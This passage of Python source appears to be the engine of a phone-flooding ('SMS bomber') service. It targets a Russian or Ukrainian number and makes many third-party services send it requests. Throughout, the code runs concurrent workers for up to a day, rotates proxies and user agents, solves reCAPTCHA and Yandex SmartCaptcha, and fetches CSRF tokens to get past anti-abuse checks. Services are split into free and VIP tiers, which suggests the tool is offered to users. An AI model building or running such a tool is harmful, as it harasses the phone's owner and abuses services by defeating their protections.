        if tpl.recaptcha_v3 and tpl.chain and tpl.chain != "multiplex":
            raise TemplateError(
                f"{tpl.name}: reCAPTCHA поддерживается в одиночном запросе или Multiplex"
            )
        if tpl.yandex_captcha and tpl.chain:
            raise TemplateError(
                f"{tpl.name}: Yandex SmartCaptcha поддерживается в одиночном запросе"
            )

        allowed = known_tokens() | DYNAMIC_TOKENS | (PREPARE_TOKENS if tpl.prepare else set())
        if tpl.recaptcha_v3 and not tpl.chain:
            allowed.add("RECAPTCHA")
        if tpl.yandex_captcha:
            allowed.update(YANDEX_TOKENS)
        if tpl.csrf:
            allowed.add("CSRF")
        unknown = _template_tokens(tpl) - allowed
        if unknown:
            raise TemplateError(f"{tpl.name}: неизвестные токены {sorted(unknown)}")
        return tpl


@dataclass(frozen=True, slots=True)
class Job:
    name: str
    method: str
    url: str
    headers: tuple[tuple[str, str], ...] = ()
    body: str = ""
    content_type: str = ""
    has_body: bool = False
    api_error: str = ""
    api_ok: str = ""
    chain: str = ""
    recaptcha_v3: RecaptchaV3 | None = None
    yandex_captcha: YandexCaptcha | None = None
    needs_uuid: bool = False
    email_probe_blob: str = ""
    csrf: CsrfSource | None = None


def _template_tokens(tpl: Template) -> set[str]:
    blob = "\x00".join(
        [tpl.url, tpl.body]
        + [f"{k}\x00{v}" for k, v in tpl.headers.items()]
    )
    return unresolved_tokens(blob)


def validate(templates: Iterable[Template]) -> list[Template]:
    seen: set[str] = set()
    dupes: list[str] = []
    for tpl in templates:
        if tpl.name in seen:
            dupes.append(tpl.name)
        seen.add(tpl.name)
    if dupes:
        raise TemplateError(f"дубли имён шаблонов: {sorted(set(dupes))}")
    return list(templates)


@lru_cache(maxsize=8)
def _load_raw(path_str: str) -> tuple:
    path = Path(path_str)
    try:
        raw = json.loads(path.read_text(encoding="utf-8"))
    except FileNotFoundError as exc:
        raise TemplateError(f"services.json не найден: {path}") from exc
    except json.JSONDecodeError as exc:
        raise TemplateError(f"services.json битый JSON: {exc}") from exc
    if isinstance(raw, dict):
        items = []
        for item in raw.get("free", []):
            if isinstance(item, dict):
                d = dict(item)
                d.setdefault("vip", False)
                items.append(d)
        for item in raw.get("vip", []):
            if isinstance(item, dict):
                d = dict(item)
                d["vip"] = True
                items.append(d)
        for key, val in raw.items():
            if key not in ("free", "vip") and isinstance(val, list):
                for item in val:
                    if isinstance(item, dict):
                        items.append(dict(item))
        return tuple(items)
    if not isinstance(raw, list):
        raise TemplateError("services.json должен быть массивом шаблонов или объектом с секциями free и vip")
    return tuple(raw)


@lru_cache(maxsize=8)
def _load_parsed(path_str: str, strict: bool) -> tuple[Template, ...]:
    return tuple(parse_templates(list(_load_raw(path_str)), strict=strict))


def parse_templates(raw: list | dict, strict: bool = True) -> list[Template]:
    if isinstance(raw, dict):
        items = []
        for item in raw.get("free", []):
            if isinstance(item, dict):
                d = dict(item)
                d.setdefault("vip", False)
                items.append(d)
        for item in raw.get("vip", []):
            if isinstance(item, dict):
                d = dict(item)
                d["vip"] = True
                items.append(d)
        for key, val in raw.items():
            if key not in ("free", "vip") and isinstance(val, list):
                for item in val:
                    if isinstance(item, dict):
                        items.append(dict(item))
        raw = items
    templates: list[Template] = []
    for item in raw:
        try:
            templates.append(Template.from_raw(item))
        except TemplateError as exc:
            if strict:
                raise
            logger.warning("template skipped: %s", exc)
    return validate(templates)


def load_templates(path: str | Path | None = None, strict: bool = True) -> list[Template]:
    resolved = Path(path).resolve() if path else DEFAULT_SERVICES_PATH
    _load_raw.cache_clear()
    _load_parsed.cache_clear()
    templates = list(_load_parsed(str(resolved), strict))
    logger.info("templates loaded: %d (%s)", len(templates), resolved.name)
    return templates


def fireable(
    templates: Iterable[Template],
    country_code: str,
    *,
    is_vip: bool = True,
    free_limit: int | None = None,
) -> list[Template]:
    out: list[Template] = []
    for tpl in templates:
        if tpl.country != country_code:
            continue
        if tpl.needs_prepare and not tpl.prepare:
            continue
        if not tpl.has_phone and not tpl.prepare:
            continue
        if not is_vip and tpl.vip:
            continue
        out.append(tpl)
    if not is_vip:
        limit = (
            free_limit
            if free_limit is not None
            else getattr(config, "free_request_services_limit", 30)
        )
        return out[:limit]
    return out


def build_job(tpl: Template, format_phone: Callable[[str], str]) -> Job:
    headers = tuple(
        (key, format_phone(value))
        for key, value in tpl.headers.items()
        if key.lower() != "user-agent"
    )
    return Job(
        name=tpl.name,
        method=tpl.method,
        url=format_phone(tpl.url),
        headers=headers,
        body=format_phone(tpl.body) if tpl.body else "",
        content_type=tpl.content_type,
        has_body=bool(tpl.body),
        api_error=tpl.api_error,
        api_ok=tpl.api_ok,
        chain=tpl.chain,
        recaptcha_v3=tpl.recaptcha_v3,
        yandex_captcha=tpl.yandex_captcha,
        needs_uuid=bool(_template_tokens(tpl) & DYNAMIC_TOKENS),
        email_probe_blob="\x00".join(
            [tpl.url, tpl.body] + [f"{k}\x00{v}" for k, v in tpl.headers.items()]
        ),
        csrf=tpl.csrf,
    )


def build_jobs(
    templates: Iterable[Template],
    format_phone: Callable[[str], str],
) -> tuple[list[Job], list[str]]:
    jobs: list[Job] = []
    broken: list[str] = []
    for tpl in templates:
        job = build_job(tpl, format_phone)
        blob = job.url + "\x00" + job.body + "\x00" + "\x00".join(v for _, v in job.headers)
        leftover = unresolved_tokens(blob) - set(DYNAMIC_TOKENS)
        if job.csrf is not None:
            leftover.discard("CSRF")
        if job.recaptcha_v3 is not None:
            leftover.discard("RECAPTCHA")
        if job.yandex_captcha is not None:
            leftover -= YANDEX_TOKENS
        if leftover:
            broken.append(tpl.name)
            continue
        jobs.append(job)
    return jobs, broken


ERR_BACKOFF_BASE = 0.2
ERR_BACKOFF_MAX = 5.0
RATE_BACKOFF = 2.0

USER_AGENTS = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
)

_MAX_DRAIN = 256 * 1024
_MAX_MARKER = 8192
_FULL_NUMBER = re.compile(r"^(7\d{10}|380\d{9})$")


class _Counter:
    __slots__ = ("value",)

    def __init__(self) -> None:
        self.value = 0

    def add(self) -> None:
        self.value += 1


async def _discard(response: aiohttp.ClientResponse) -> None:
    length = response.content_length
    if length is not None and length > _MAX_DRAIN:
        response.close()
        return
    try:
        await response.content.read(_MAX_DRAIN)
        if not response.content.at_eof():
            response.close()
    except Exception:
        response.close()


def _err_delay(consecutive: int) -> float:
    delay = ERR_BACKOFF_BASE * (2 ** min(consecutive, 10))
    return min(delay, ERR_BACKOFF_MAX)


def _retry_after_seconds(value: str | None) -> float:
    try:
        seconds = float(str(value).strip())
    except (TypeError, ValueError):
        return 0.0
    return max(0.0, min(seconds, 30.0))


def _is_proxy_error(exc: BaseException) -> bool:
    if isinstance(exc, (aiohttp.ClientHttpProxyError, aiohttp.ClientProxyConnectionError)):
        return True
    try:
        import aiohttp_socks

        if isinstance(exc, aiohttp_socks.ProxyError):
            return True
    except ImportError:
        pass
    msg = str(exc).lower()
    if "proxy" in msg and ("connect" in msg or "auth" in msg or "refused" in msg or "timeout" in msg):
        return True
    return False


class AsyncRateLimiter:
    def __init__(self, rate: float, max_lead: float = 1.0) -> None:
        self.rate = max(0.0, float(rate))
        self._interval = 1.0 / self.rate if self.rate > 0 else 0.0
        self._max_lead = max(self._interval * 2, max_lead)
        self._next_time = 0.0
        self._lock = asyncio.Lock()

    async def acquire(
        self,
        stop_event: asyncio.Event | None = None,
        deadline: float | None = None,
    ) -> bool:
        if self.rate <= 0:
            return True
        if stop_event is not None and stop_event.is_set():
            return False

        while True:
            if stop_event is not None and stop_event.is_set():
                return False
            now = time.monotonic()
            if deadline is not None and now >= deadline:
                return False

            wait_ahead = 0.0
            async with self._lock:
                now = time.monotonic()
                if deadline is not None and now >= deadline:
                    return False
                if self._next_time < now:
                    self._next_time = now

                lead = self._next_time - now
                if lead > self._max_lead:
                    wait_ahead = lead - self._max_lead
                else:
                    sleep_until = self._next_time
                    if deadline is not None and sleep_until >= deadline:
                        return False
                    self._next_time += self._interval
                    break

            if wait_ahead > 0:
                wait_ahead += random.uniform(0.005, min(max(self._interval * 0.2, 0.01), 0.05))
                if deadline is not None and time.monotonic() + wait_ahead >= deadline:
                    return False
                if stop_event is not None:
                    try:
                        await asyncio.wait_for(stop_event.wait(), timeout=wait_ahead)
                        return False
                    except asyncio.TimeoutError:
                        pass
                else:
                    await asyncio.sleep(wait_ahead)

        wait_time = sleep_until - time.monotonic()
        if wait_time > 0:
            if stop_event is not None:
                try:
                    await asyncio.wait_for(stop_event.wait(), timeout=wait_time)
                    return False
                except asyncio.TimeoutError:
                    pass
            else:
                await asyncio.sleep(wait_time)

        if stop_event is not None and stop_event.is_set():
            return False
        if deadline is not None and time.monotonic() >= deadline:
            return False
        return True


class Attack:
    def __init__(
        self,
        phone: str,
        jobs: Iterable[Job],
        duration: int,
        *,
        workers: int = 1,
        delay: float = 0.35,
        rate_limit: float = 0.0,
        session: aiohttp.ClientSession,
        proxy: str = "",
        attack_id: str | None = None,
        pool: ProxyPool | None = None,
        country: str = "",
        emulation: bool = False,
        emul_workers: int = 4,
    ) -> None:
        self.id = attack_id or uuid.uuid4().hex[:16]
        self.phone = phone
        self.jobs = list(jobs)
        self.duration = max(1, int(duration))
        self.workers = max(1, int(workers))
        self.delay = max(0.0, float(delay))
        self.rate_limit = max(0.0, float(rate_limit))
        self._rate_limiter = AsyncRateLimiter(self.rate_limit) if self.rate_limit > 0 else None
        self.session = session
        self.proxy = proxy or ""
        self.country = country.upper().strip() if country else ""
        if not self.country and self.phone:
            try:
                _, c_code = parse_phone(self.phone)
                self.country = c_code
            except Exception:
                self.country = ""
        self.emulation = bool(emulation)
        self.emul_workers = max(1, int(emul_workers))
        self._http_proxy = self.proxy if self.proxy and not is_socks(self.proxy) else None
        self.pool = pool
        self._recaptcha = RecaptchaCache(getattr(config, "recaptcha_timeout", 20))
        self._yandex = YandexCaptchaCache(
            getattr(config, "yandex_captcha_timeout", 25),
            retries=getattr(config, "yandex_captcha_retries", 2),
        )
        self._direct_kwargs = (
            {"proxy": self._http_proxy} if self._http_proxy else {}
        )
        base_timeout = getattr(session, "timeout", None)
        sock_read = float(getattr(base_timeout, "sock_read", 6.0) or 6.0)
        self._request_timeout = aiohttp.ClientTimeout(
            total=max(sock_read * 4.0, 10.0),
            connect=8.0,
            sock_connect=min(sock_read, 5.0),
            sock_read=sock_read,
        )
        self._sent = _Counter()
        self._ok = _Counter()
        self._err = _Counter()
        self._unconfirmed = _Counter()
        self.failures: dict[str, int] = {}
        self.statuses: dict[int, int] = {}
        self.by_service: dict[str, dict[int, int]] = {}

        self.started_at = 0.0
        self.deadline = 0.0
        self._stop = asyncio.Event()
        self._done = asyncio.Event()
        self.user_stopped = False
        self._workers: list[asyncio.Task] = []
        self._browser: Any = None
        self._runner: asyncio.Task | None = None

    @property
    def running(self) -> bool:
        return not self._done.is_set()

    def start(self, deadline: float | None = None) -> "Attack":
        self.started_at = time.monotonic()
        self.deadline = deadline if deadline else self.started_at + self.duration
        self._runner = asyncio.create_task(self.run(), name=f"attack-{self.id}")
        return self

    @property
    def sent(self) -> int:
        return self._sent.value

    @property
    def ok(self) -> int:
        return self._ok.value

    @property
    def err(self) -> int:
        return self._err.value

    def stop(self, by_user: bool = True) -> None:
        self.user_stopped = self.user_stopped or by_user
        self._stop.set()
        for task in self._workers:
            if not task.done():
                task.cancel()
        if self._browser is not None:
            self._browser.stop(by_user=by_user)

    async def wait(self) -> None:
        await self._done.wait()

    async def run(self) -> None:
        if time.monotonic() >= self.deadline:
            self._done.set()
            return
        spread = min(2.0, self.duration / 4) if self.jobs else 0.0
        step = spread / len(self.jobs) if self.jobs else 0.0
        workers = [
            asyncio.create_task(
                self._worker(job, index, stagger=position * step),
                name=f"{self.id}-{job.name}-{index}",
            )
            for position, job in enumerate(self.jobs)
            for index in range(self.workers)
        ]
        self._workers = workers
        if self.emulation:
            try:
                from browser import BrowserAttack

                self._browser = BrowserAttack(
                    self.phone,
                    self.duration,
                    workers=self.emul_workers,
                    timeout=getattr(config, "emul_page_timeout", 15.0),
                    proxy="",
                    pool=None,
                    control=self,
                    context_rotation=getattr(config, "emul_context_rotation", 20),
                )
                self._browser.start(deadline=self.deadline)
            except Exception as exc:
                logger.warning("attack %s: browser channel unavailable: %r", self.id, exc)
        watchdog = asyncio.create_task(self._deadline_watch())
        try:
            await asyncio.gather(*workers)
        except asyncio.CancelledError:
            for task in workers:
                task.cancel()
            await asyncio.gather(*workers, return_exceptions=True)
            raise
        except Exception:
            logger.exception("attack %s: worker crashed", self.id)
            for task in workers:
                task.cancel()
            await asyncio.gather(*workers, return_exceptions=True)
        finally:
            watchdog.cancel()
            if self._browser is not None:
                self._browser.stop(by_user=False)
                await self._browser.wait()
                await self._browser.aclose()
            await self._yandex.aclose()
            self._done.set()

    async def _deadline_watch(self) -> None:
        try:
            remaining = self.deadline - time.monotonic()
            if remaining > 0:
                await asyncio.sleep(remaining)
            self.stop(by_user=False)
        except asyncio.CancelledError:
            pass

    def snapshot(self) -> dict:
        return {
            "sent": self.sent,
            "ok": self.ok,
            "err": self.err,
            "unconfirmed": self._unconfirmed.value,
            "running": self.running,
            "rate_limit": self.rate_limit,
            "emulation": self.emulation,
            "failures": dict(self.failures),
            "statuses": dict(self.statuses),
            "by_service": {name: dict(counts) for name, counts in self.by_service.items()},
        }

    def _note_failure(self, kind: str) -> None:
        self.failures[kind] = self.failures.get(kind, 0) + 1

    @property
    def stopped(self) -> bool:
        return self._stop.is_set()

    async def acquire_rate(self) -> bool:
        if self._rate_limiter is None:
            return not self._stop.is_set()
        return await self._rate_limiter.acquire(self._stop, deadline=self.deadline)

    def note_request(
        self, status: int, service: str = "", *, accepted: bool = False, rejected: bool = False
    ) -> None:
        self._sent.add()
        self._note_status(status, service)
        if 200 <= status < 300:
            if accepted and not rejected:
                self._ok.add()
            else:
                self._unconfirmed.add()

    def note_error(self, kind: str) -> None:
        self._err.add()
        self._note_failure(kind)

    async def pause(self, seconds: float) -> None:
        await self._pause(seconds)

    def _note_status(self, status: int, service: str = "") -> None:
        self.statuses[status] = self.statuses.get(status, 0) + 1
        if service:
            counts = self.by_service.setdefault(service, {})
            counts[status] = counts.get(status, 0) + 1

    async def _route(self, proxy) -> tuple[aiohttp.ClientSession, dict]:
        if proxy is None or self.pool is None:
            return self.session, self._direct_kwargs
        return await self.pool.connection(proxy)

    async def _worker(self, job: Job, index: int, stagger: float = 0.0) -> None:
        rng = random.Random(f"{self.id}:{job.name}:{index}")
        consecutive_errors = 0
        job_body = job.body.encode("utf-8") if job.has_body else None
        if stagger and not self._stop.is_set():
            await self._pause(stagger * rng.uniform(0.5, 1.0))

        while not self._stop.is_set() and time.monotonic() < self.deadline:
            if self._rate_limiter is not None:
                if not await self._rate_limiter.acquire(self._stop, deadline=self.deadline):
                    break
            headers = dict(job.headers)
            headers["User-Agent"] = rng.choice(USER_AGENTS)
            if job.has_body and job.content_type:
                headers["Content-Type"] = job.content_type
            retry_after = 0.0
            proxy = self.pool.pick(self.country) if self.pool else None
            try:
                session, proxy_kwargs = await self._route(proxy)
                dynamic: dict[str, str] = {}
                if job.csrf is not None:
                    dynamic["CSRF"] = await csrf_token(session, job.csrf, proxy_kwargs)
                if job.needs_uuid:
                    dynamic["UUID"] = str(uuid.uuid4())
                if "{{EMAIL}}" in job.email_probe_blob:
                    dynamic["EMAIL"] = random_email(rng)
                solver_proxy = proxy.proxy_url if proxy is not None else self.proxy
                if (job.recaptcha_v3 or job.yandex_captcha) and not job.chain:
                    if job.recaptcha_v3:
                        dynamic["RECAPTCHA"] = await self._recaptcha.token(
                            job.name, job.recaptcha_v3, solver_proxy or None
                        )
                    if job.yandex_captcha:
                        yandex_token = await self._yandex.token(
                            job.name, job.yandex_captcha, solver_proxy or None
                        )
                        for name in YANDEX_TOKENS:
                            dynamic[name] = yandex_token
                url, request_headers, body = job.url, headers, job_body
                if dynamic:
                    url = fill_tokens(job.url, dynamic)
                    request_headers = {
                        key: fill_tokens(value, dynamic) for key, value in headers.items()
                    }
                    body = (
                        fill_tokens(job.body, dynamic).encode("utf-8")
                        if job.has_body
                        else None
                    )
                if job.chain:
                    handler = CHAINS[job.chain]
                    args = (
                        session,
                        self.phone,
                        dict(job.headers),
                        proxy_kwargs.get("proxy", self._http_proxy),
                    )
                    if job.recaptcha_v3:
                        args += (self._recaptcha, job.recaptcha_v3, solver_proxy or None)
                    p_auth = proxy_kwargs.get("proxy_auth")
                    if p_auth is not None:
                        try:
                            status, chunk = await handler(*args, proxy_auth=p_auth)
                        except TypeError:
                            status, chunk = await handler(*args)
                    else:
                        status, chunk = await handler(*args)
                    rejected = bool(job.api_error) and job.api_error.encode() in chunk
                    accepted = bool(job.api_ok) and job.api_ok.encode() in chunk
                else:
                    async with session.request(
                        job.method,
                        url,
                        headers=request_headers,
                        data=body,
                        allow_redirects=True,
                        timeout=self._request_timeout,
                        **proxy_kwargs,
                    ) as response:
                        status = response.status
                        rejected = False
                        accepted = False
                        if 200 <= status < 300:
                            chunk = await response.content.read(_MAX_MARKER)
                            if job.api_error:
                                rejected = job.api_error.encode() in chunk
                            if job.api_ok:
                                accepted = job.api_ok.encode() in chunk
                            response.close()
                        else:
                            retry_after = _retry_after_seconds(
                                response.headers.get("Retry-After")
                            )
                            await self._drain(response)
            except asyncio.CancelledError:
                raise
            except Exception as exc:
                self._err.add()
                self._note_failure(type(exc).__name__)
                if self.pool is not None and _is_proxy_error(exc):
                    self.pool.report(proxy, False)
                await self._pause(_err_delay(consecutive_errors))
                consecutive_errors += 1
                continue

            consecutive_errors = 0
            self._sent.add()
            self._note_status(status, job.name)
            if self.pool is not None:
                self.pool.report(proxy, True)
            if 200 <= status < 300:
                if not rejected and accepted:
                    self._ok.add()
                else:
                    self._unconfirmed.add()

            if status == 429:
                await self._pause(
                    retry_after or (RATE_BACKOFF + rng.uniform(0, 0.5))
                )
            elif self.delay:
                await self._pause(self.delay + rng.uniform(0, self.delay / 2))

    async def _pause(self, seconds: float) -> None:
        if seconds <= 0 or self._stop.is_set():
            return
        try:
            await asyncio.wait_for(self._stop.wait(), timeout=seconds)
        except asyncio.TimeoutError:
            pass

    @staticmethod
    async def _drain(response: aiohttp.ClientResponse) -> None:
        await _discard(response)

    def __repr__(self) -> str:
        return f"<Attack {self.id} {self.phone} sent={self.sent} ok={self.ok} err={self.err}>"


PRUNE_AFTER = 600.0
_MAX_TEMPLATE_WARN = 5


class EngineError(RuntimeError):
    pass


class BadRequest(EngineError):
    pass


class NoServices(EngineError):
    pass


class Busy(EngineError):
    pass


class AttackManager:
    def __init__(
        self,
        templates: Iterable[Template] | None = None,
        *,
        proxy: str = "",
        proxies: Iterable[Proxy] | None = None,
        proxy_cooldown: float = 60.0,
        proxy_fail_threshold: int = 3,
        timeout: float = 6.0,
        delay_ms: int = 350,
        max_attacks: int = 10,
        max_workers: int = 2,
        rate_limit: float = 0.0,
    ) -> None:
        self.templates: list[Template] = list(templates) if templates is not None else load_templates()
        self.proxy = proxy
        self.delay = max(0.0, delay_ms / 1000.0)
        self.rate_limit = max(0.0, float(rate_limit))
        self.max_attacks = max(0, int(max_attacks))
        self.max_workers = max(1, int(max_workers))

        self.session = create_session(proxy, timeout)
        self.pool = (
            ProxyPool(
                proxies,
                self.session,
                cooldown=proxy_cooldown,
                threshold=proxy_fail_threshold,
            )
            if proxies and not proxy
            else None
        )
        self.started_at = int(time.time())
        self._attacks: dict[str, Attack] = {}
        self._finished_at: dict[str, float] = {}
        self._lock = asyncio.Lock()
        self._closed = False

        self._proxy_cooldown = proxy_cooldown
        self._proxy_fail_threshold = proxy_fail_threshold
        self._services_path: Path = (
            Path(getattr(config, "services_file", None) or DEFAULT_SERVICES_PATH).resolve()
        )
        self._proxies_path: Path = (
            Path(getattr(config, "proxies_file", None) or DEFAULT_PROXIES_PATH).resolve()
        )
        self._services_mtime: int = -1
        self._proxies_mtime: int = -1
        try:
            if self._services_path.exists():
                self._services_mtime = self._services_path.stat().st_mtime_ns
        except Exception:
            pass
        try:
            if self._proxies_path.exists():
                self._proxies_mtime = self._proxies_path.stat().st_mtime_ns
        except Exception:
            pass

    def reload_templates(
        self, path: str | Path | None = None, *, strict: bool = False
    ) -> list[Template]:
        templates = load_templates(path, strict=strict)
        self.templates = templates
        logger.info("templates reloaded: %d (%s)", len(templates), path or DEFAULT_SERVICES_PATH)
        return templates

    @property
    def browser_services(self) -> dict[str, Any]:
        try:
            from browser import SERVICES
            return SERVICES
        except Exception:
            return {}

    @property
    def browser_service_countries(self) -> dict[str, str]:
        try:
            from browser import SERVICE_COUNTRIES
            return SERVICE_COUNTRIES
        except Exception:
            return {}

    @property
    def total_services_count(self) -> int:
        return len(self.templates) + len(self.browser_services)

    def reload_proxies(self, path: str | Path | None = None) -> list[Proxy]:
        if self.proxy:
            return []
        target_path = Path(path) if path else self._proxies_path
        proxies = load_proxies(target_path)
        ru_cnt = sum(1 for p in proxies if p.country == "RU")
        ua_cnt = sum(1 for p in proxies if p.country == "UA")
        if self.pool is None:
            if proxies:
                self.pool = ProxyPool(
                    proxies,
                    self.session,
                    cooldown=self._proxy_cooldown,
                    threshold=self._proxy_fail_threshold,
                )
                logger.info(
                    "proxies loaded: %d (RU: %d, UA: %d) (%s)",
                    len(proxies), ru_cnt, ua_cnt, target_path,
                )
        else:
            self.pool.update_entries(proxies)
            logger.info(
                "proxies reloaded: %d (RU: %d, UA: %d) (%s)",
                len(proxies), ru_cnt, ua_cnt, target_path,
            )
        return proxies

    def check_and_reload(self) -> tuple[bool, bool]:
        services_changed = False
        proxies_changed = False

        try:
            if self._services_path.exists():
                cur_mtime = self._services_path.stat().st_mtime_ns
                if self._services_mtime == -1:
                    self._services_mtime = cur_mtime
                elif cur_mtime != self._services_mtime:
                    self.reload_templates(self._services_path)
                    self._services_mtime = cur_mtime
                    services_changed = True
        except TemplateError as exc:
            logger.warning("auto-reload services.json skipped (invalid): %s", exc)
        except Exception as exc:
            logger.warning("auto-reload services check failed: %r", exc)

        try:
            if not self.proxy:
                if self._proxies_path.exists():
                    cur_mtime = self._proxies_path.stat().st_mtime_ns
                    if self._proxies_mtime == -1:
                        self._proxies_mtime = cur_mtime
                    elif cur_mtime != self._proxies_mtime:
                        self.reload_proxies(self._proxies_path)
                        self._proxies_mtime = cur_mtime
                        proxies_changed = True
                elif self._proxies_mtime != -1:
                    self._proxies_mtime = -1
                    self.reload_proxies(self._proxies_path)
                    proxies_changed = True
        except Exception as exc:
            logger.warning("auto-reload proxies check failed: %r", exc)

        return services_changed, proxies_changed

    async def start(
        self,
        raw_phone: str,
        duration: int,
        workers: int = 1,
        *,
        rate_limit: float | None = None,
        guard: Callable[[], Awaitable[bool]] | None = None,
        emulation: bool = False,
        emul_workers: int | None = None,
        is_vip: bool = False,
    ) -> Attack:
        if self._closed:
            raise EngineError("движок остановлен")

        eff_emul_workers = (
            getattr(config, "emul_workers", 2) if emul_workers is None else max(1, int(emul_workers))
        )
        eff_rate_limit = self.rate_limit if rate_limit is None else max(0.0, float(rate_limit))

        try:
            self.check_and_reload()
        except Exception:
            pass

        digits, country_code = parse_phone(raw_phone)
        if not _FULL_NUMBER.match(digits):
            raise BadRequest("некорректный номер")
        if not (1 <= int(duration) <= 86400):
            raise BadRequest("некорректная длительность")

        workers = max(1, int(workers))
        if self.max_workers:
            workers = min(workers, self.max_workers)

        self._prune()
        async with self._lock:
            if self.max_attacks and self._active_count() >= self.max_attacks:
                raise Busy("все слоты атак заняты")
            reserved = Attack(
                digits,
                [],
                duration,
                workers=workers,
                delay=self.delay,
                rate_limit=eff_rate_limit,
                session=self.session,
            )
            self._attacks[reserved.id] = reserved

        try:
            jobs = await self._prepare_jobs(digits, country_code, is_vip=is_vip)
            if guard is not None and not await guard():
                raise EngineError("запуск отменён: номер под защитой")
        except BaseException:
            async with self._lock:
                self._attacks.pop(reserved.id, None)
            raise

        async with self._lock:
            self._attacks.pop(reserved.id, None)
            if reserved.user_stopped or self._closed:
                raise EngineError("запуск отменён")
            attack = Attack(
                digits,
                jobs,
                duration,
                workers=workers,
                delay=self.delay,
                rate_limit=eff_rate_limit,
                session=self.session,
                proxy=self.proxy,
                pool=self.pool,
                country=country_code,
                emulation=emulation,
                emul_workers=eff_emul_workers,
            )
            self._attacks[attack.id] = attack

        attack.start(deadline=time.monotonic() + duration)
        logger.info(
            "attack %s started: +%s %ss services=%d workers=%d vip=%s",
            attack.id, digits, duration, len(jobs), workers, is_vip,
        )
        return attack

    async def _prepare_jobs(
        self, digits: str, country_code: str, *, is_vip: bool = True
    ) -> list[Job]:
        tpls = fireable(self.templates, country_code, is_vip=is_vip)
        if not tpls:
            raise NoServices(f"нет сервисов для страны {country_code}")

        providers = {tpl.prepare for tpl in tpls if tpl.prepare}
        prepared: dict[str, dict[str, str]] = {}
        if providers:
            prepared = await prepare_tokens(self.session, providers)
            missing = providers - prepared.keys()
            if missing:
                logger.warning("prepare failed: %s; templates dropped", ", ".join(sorted(missing)))
                tpls = [tpl for tpl in tpls if tpl.prepare not in missing]
                if not tpls:
                    raise NoServices(f"нет рабочих сервисов для страны {country_code}")

        tokens: dict[str, str] = {}
        for name in providers:
            tokens.update(prepared.get(name, {}))

        jobs, broken = build_jobs(tpls, make_formatter(digits, tokens))
        if broken:
            logger.warning(
                "templates skipped (unresolved tokens): %s%s",
                ", ".join(broken[:_MAX_TEMPLATE_WARN]),
                "…" if len(broken) > _MAX_TEMPLATE_WARN else "",
            )
        if not jobs:
            raise NoServices(f"нет рабочих сервисов для страны {country_code}")
        return jobs

    async def stop_all(self, timeout: float = 5.0) -> None:
        attacks = list(self._attacks.values())
        for attack in attacks:
            attack.stop(by_user=False)
        if not attacks:
            return
        waiters = [asyncio.create_task(a.wait()) for a in attacks]
        done, pending = await asyncio.wait(waiters, timeout=timeout)
        for task in pending:
            task.cancel()
        if pending:
            logger.warning("engine: %d attack(s) did not stop in %.1fs", len(pending), timeout)

    async def shutdown(self) -> None:
        self._closed = True
        await self.stop_all()
        for attack in list(self._attacks.values()):
            runner = attack._runner
            if runner and not runner.done():
                runner.cancel()
        await asyncio.gather(
            *(a._runner for a in self._attacks.values() if a._runner),
            return_exceptions=True,
        )
        if self.pool is not None:
            try:
                await self.pool.close()
            except Exception as exc:
                logger.warning("proxy pool shutdown: %r", exc)
        if not self.session.closed:
            await self.session.close()
        logger.info("engine shutdown complete")

    def _active_count(self) -> int:
        return sum(1 for attack in self._attacks.values() if attack.running)

    def health(self) -> dict:
        self._prune()
        b_count = len(self.browser_services)
        return {
            "ok": not self._closed,
            "attacks": self._active_count(),
            "started_at": self.started_at,
            "templates": len(self.templates),
            "browser_services": b_count,
            "total_services": len(self.templates) + b_count,
            "max_attacks": self.max_attacks,
            "max_workers": self.max_workers,
            "delay_ms": int(self.delay * 1000),
            "proxies": self.pool.stats() if self.pool is not None else {},
        }

    def _prune(self) -> None:
        now = time.monotonic()
        for attack_id, attack in list(self._attacks.items()):
            if attack.running:
                continue
            finished = self._finished_at.setdefault(attack_id, now)
            if now - finished > PRUNE_AFTER:
                self._attacks.pop(attack_id, None)
                self._finished_at.pop(attack_id, None)
